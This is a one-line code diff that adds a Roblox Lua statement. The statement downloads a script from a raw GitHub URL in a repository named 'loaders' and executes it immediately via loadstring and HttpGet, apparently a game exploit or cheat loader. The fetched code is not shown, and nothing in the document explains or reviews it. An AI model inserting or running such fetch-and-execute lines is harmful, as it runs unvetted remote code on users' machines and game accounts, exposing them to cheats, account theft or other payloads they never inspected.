@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/upd-8-cvr-retro-spam5-vyw54eqjgwygu1.lua"))()
